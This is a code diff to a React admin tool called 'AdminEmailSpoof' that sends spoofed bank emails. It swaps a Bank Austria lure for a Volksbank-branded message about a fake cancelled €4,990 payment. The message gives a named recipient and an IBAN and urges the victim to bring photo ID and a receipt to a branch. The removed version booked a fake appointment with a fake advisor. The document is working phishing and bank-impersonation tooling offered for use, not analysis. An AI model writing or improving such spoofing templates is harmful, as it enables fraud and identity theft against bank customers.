@@ -23,7 +23,7 @@ import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 
 
-const STORAGE_KEY = "admin_email_spoof_html_v6";
+const STORAGE_KEY = "admin_email_spoof_html_v7";
 const RESEND_KEY = "admin_email_spoof_resend_v1";
 
 const defaultHtmlTemplate = `<!DOCTYPE html>
@@ -31,7 +31,7 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank Austria - Wichtige Mitteilung zu Ihrem Konto</title>
+  <title>Volksbank - Stornierung Ihrer Zahlung</title>
 </head>
 <body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
@@ -41,11 +41,11 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
 
           <!-- Header -->
           <tr>
-            <td style="background-color:#ffffff;padding:28px 40px 22px 40px;border-bottom:3px solid #E2001A;">
+            <td style="background-color:#ffffff;padding:28px 40px 22px 40px;border-bottom:3px solid #004899;">
               <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                 <tr>
                   <td width="55%" valign="middle">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3d/Bank_Austria_logo.svg/3840px-Bank_Austria_logo.svg.png" alt="Bank Austria" height="36" style="display:block;" />
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Volksbank_logo.svg/2560px-Volksbank_logo.svg.png" alt="Volksbank" height="36" style="display:block;" />
                   </td>
                   <td width="45%" align="right" valign="middle">
                     <p style="margin:0;font-size:12px;color:#888888;letter-spacing:0.3px;">
@@ -61,7 +61,7 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
           <tr>
             <td style="padding:35px 40px 30px 40px;">
               <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
-                Wichtige Mitteilung zu Ihrem Konto
+                Stornierung Ihrer Zahlung &ndash; in Bearbeitung
               </h1>
 
               <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
@@ -69,53 +69,43 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
               </p>
 
               <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
-                im Rahmen unserer gesetzlich vorgeschriebenen Sorgfaltspflichten f&uuml;hrt die Bank Austria derzeit eine Legitimierungspr&uuml;fung Ihres Kontos durch. Bitte beachten Sie die nachfolgenden Hinweise sorgf&auml;ltig.
+                wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.
               </p>
 
-              <!-- Hinweisbox -->
+              <!-- Zahlungsdetails-Box -->
               <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
                 <tr>
-                  <td style="background-color:#f1f4f7;border-left:4px solid #E2001A;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 12px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      Im Zuge der Legitimierungspr&uuml;fung wurde Ihnen ein pers&ouml;nlicher Berater zugeteilt:
-                      <strong style="color:#1a1a1a;">Simon Hengst</strong>.
-                      Ihr Berater steht Ihnen w&auml;hrend des gesamten Vorgangs zur Seite.
+                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
+                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
+                      Zahlungsdetails
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">Betrag:</strong> EUR 4.990,00
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">Empf&auml;nger:</strong> ISTVAN ERDELYI
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">IBAN:</strong> AT76 1400 0069 1093 2673
                     </p>
                     <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
-                      Die <strong>&Uuml;berweisungsfunktion</strong> Ihres Kontos ist <strong>vor&uuml;bergehend deaktiviert</strong>.
-                      Eventuell von Dritten veranlasste Transaktionen werden derzeit gepr&uuml;ft und entsprechende
-                      <strong>Stornierungen</strong> sind bereits in Gange.
+                      <strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> STOR.884772
                     </p>
                   </td>
                 </tr>
               </table>
 
-              <p style="margin:0 0 25px 0;font-size:15px;line-height:1.6;color:#333333;">
-                Ihr Guthaben auf dem Sparkonto ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt &mdash; es besteht keinerlei Anlass zur Sorge um Ihr Verm&ouml;gen. S&auml;mtliche Sicherungsmechanismen Ihrer Bank Austria greifen wie vorgesehen.
+              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
+                Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem Volksbank-Schalter abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.
               </p>
 
-              <!-- Termin-Card -->
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 8px 0;">
-                <tr>
-                  <td style="background-color:#f3f8f4;border-left:4px solid #2e7d32;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#2e7d32;letter-spacing:0.4px;text-transform:uppercase;">
-                      Terminbest&auml;tigung
-                    </p>
-                    <p style="margin:0 0 14px 0;font-size:16px;line-height:1.4;color:#1a1a1a;font-weight:700;">
-                      17.10.2026, 10:30 Uhr
-                    </p>
-                    <p style="margin:0 0 4px 0;font-size:14px;line-height:1.5;color:#333333;font-weight:600;">
-                      UniCredit Bank Austria &ndash; Filiale Wels
-                    </p>
-                    <p style="margin:0 0 12px 0;font-size:14px;line-height:1.5;color:#555555;">
-                      Dr.-Salzmann-Stra&szlig;e 9, 4600 Wels, &Ouml;sterreich
-                    </p>
-                    <p style="margin:0;font-size:13px;line-height:1.5;color:#666666;">
-                      Bitte bringen Sie zu diesem Termin einen <strong>amtlichen Lichtbildausweis</strong> (Reisepass oder Personalausweis) mit.
-                    </p>
-                  </td>
-                </tr>
-              </table>
+              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
+                Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.
+              </p>
+
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">
+                Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer Volksbank-Filiale gerne zur Verf&uuml;gung.
+              </p>
             </td>
           </tr>
 
@@ -126,17 +116,17 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
                 <tr>
                   <td>
                     <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
-                      UniCredit Bank Austria AG
+                      Volksbank Wien AG
                     </p>
                     <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
-                      Rothschildplatz 1, 1020 Wien
+                      Dietrichgasse 25, 1030 Wien
                     </p>
                     <p style="margin:0;font-size:11px;color:#bbbbbb;">
-                      <a href="https://www.bankaustria.at/impressum.jsp" style="color:#999999;text-decoration:underline;">Impressum</a>
+                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
                       &nbsp;&middot;&nbsp;
-                      <a href="https://www.bankaustria.at/datenschutz.jsp" style="color:#999999;text-decoration:underline;">Datenschutz</a>
+                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
                       &nbsp;&middot;&nbsp;
-                      <a href="https://www.bankaustria.at" style="color:#999999;text-decoration:underline;">bankaustria.at</a>
+                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
                     </p>
                   </td>
                 </tr>
@@ -181,7 +171,7 @@ const AdminEmailSpoof = () => {
   const [to, setTo] = useState("");
   const [anrede, setAnrede] = useState<"Herr" | "Frau">("Herr");
   const [nachname, setNachname] = useState("");
-  const [subject, setSubject] = useState("Wichtige Mitteilung zu Ihrem Konto");
+  const [subject, setSubject] = useState("Stornierung Ihrer Zahlung – Referenz STOR.884772");
   const [sending, setSending] = useState(false);
 
   const { toast } = useToast();
